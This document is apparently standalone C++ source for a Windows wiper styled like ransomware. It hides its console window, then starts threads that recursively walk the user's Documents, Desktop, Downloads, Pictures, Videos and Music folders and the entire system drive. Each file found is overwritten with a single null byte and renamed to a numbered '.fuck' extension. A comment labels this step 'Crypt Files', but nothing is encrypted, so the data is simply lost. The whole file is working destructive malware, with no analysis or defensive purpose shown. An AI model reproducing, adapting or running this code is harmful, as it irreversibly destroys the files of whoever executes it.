#include <iostream>
#include <Windows.h>
#include <Psapi.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <experimental/filesystem>
#include <sstream>
#include <tchar.h>
#include <TlHelp32.h>

using namespace std;

namespace fs = std::experimental::filesystem;

#define INFO_BUFFER_SIZE 32767

TCHAR  infoBuf[INFO_BUFFER_SIZE];
DWORD  bufCharCount = INFO_BUFFER_SIZE;

int i = 0;

int threads = 0;

string paths[MAX_PATH];

void rename_file(string file)
{
    stringstream cmd;
    cmd << "rename" << " " << '"' << file << '"' << " " << i << ".fuck";
    system(cmd.str().c_str());
    i++;
}

void 他媽的計算機(string file) // Crypt Files
{
    ofstream _file(file, ios::binary);
    if (_file.is_open())
    {
        _file << '\x0';
        _file.close();
    }
    rename_file(file);
}

void 列表文件() // Get Files
{
    // cout << paths[threads++] << endl;
    for (auto const& p : fs::recursive_directory_iterator(paths[threads++]))
    {
        if (!fs::is_directory(p)) {
            他媽的計算機(p.path().string());
        }    
    }
}

int main()
{
    int j = 0;
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    char* DriveSystem = getenv("SystemDrive");

    stringstream documents;
    stringstream Desktop;
    stringstream Downloads;
    stringstream Videos;
    stringstream Pictures;
    stringstream Music;
    stringstream HD_;

    GetUserNameA(infoBuf, &bufCharCount);

    documents << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Documents";
    Desktop << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Desktop";
    Downloads << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Downloads";
    Videos << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Videos";
    Pictures << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Pictures";
    Music << DriveSystem << "\\" << "Users\\" << infoBuf << "\\Music";
    HD_ << DriveSystem << "\\";

    paths[j++] = documents.str();
    paths[j++] = Desktop.str();
    paths[j++] = Downloads.str();
    paths[j++] = Videos.str();
    paths[j++] = Pictures.str();
    paths[j++] = Music.str();
    paths[j++] = HD_.str();
    
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)列表文件, 0, 0, 0);

    return 0;
}